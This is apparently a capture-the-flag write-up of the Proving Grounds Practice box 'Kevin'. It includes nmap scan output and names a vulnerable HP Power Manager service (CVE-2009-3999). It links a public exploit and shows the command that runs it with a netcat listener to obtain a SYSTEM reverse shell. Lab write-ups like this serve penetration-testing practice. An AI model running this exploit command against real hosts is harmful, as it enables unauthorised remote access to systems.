---
title: "PG Practice - Kevin"
date: 2026-06-22
draft: false
tags: ["Proving Grounds Practice", "Linux", "Write-Up"]
cover:
    image: "/images/writeup_screens/pg_kevin/pg_kevin_cover.svg"      
    alt: "Cover"
    relative: true     
ShowToc: false
---

**Box Details**

|   |   |
|---|---|
| a | a |
| Difficulty | Easy |
| Type | Windows |

**Port Scan**

```
└─$ nmap -sV -sC -p- 192.168.237.45
PORT      STATE SERVICE       VERSION
80/tcp    open  http          GoAhead WebServer
| http-title: HP Power Manager
|_Requested resource was http://192.168.237.45/index.asp
|_http-server-header: GoAhead-Webs
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows 7 Ultimate N 7600 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
| ssl-cert: Subject: commonName=kevin
| Not valid before: 2026-06-22T18:36:27
|_Not valid after:  2026-12-22T18:36:27
| rdp-ntlm-info: 
|   Target_Name: KEVIN
|   NetBIOS_Domain_Name: KEVIN
|   NetBIOS_Computer_Name: KEVIN
|   DNS_Domain_Name: kevin
|   DNS_Computer_Name: kevin
|   Product_Version: 6.1.7600
|_  System_Time: 2026-06-23T18:41:26+00:00
|_ssl-date: 2026-06-23T18:41:34+00:00; +2s from scanner time.
3573/tcp  open  tag-ups-1?
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC
49160/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: KEVIN; OS: Windows; CPE: cpe:/o:microsoft:windows

```

## Proof 

On the webserver on port **80** a **HP Power Manager** instance is running. The used version **4.0.2** is vulnerable to **CVE-2009-3999** for which i found this [public exploit](https://github.com/AC8999/CVE-2009-3999-HP-Power-Manager-4.2-Build-7-Buffer-Overflow/blob/main/CVE-2009-3999.py). I ran the exploit as follows after starting a netcat listener on port **4444**:

```
└─$ python3 CVE-2009-3999.py $IP 80 192.168.45.212 4444
```

Shortly after, I received a _SYSTEM_ reverse shell and was able to read _C:\Users\Administrator\Desktop\proof.txt_.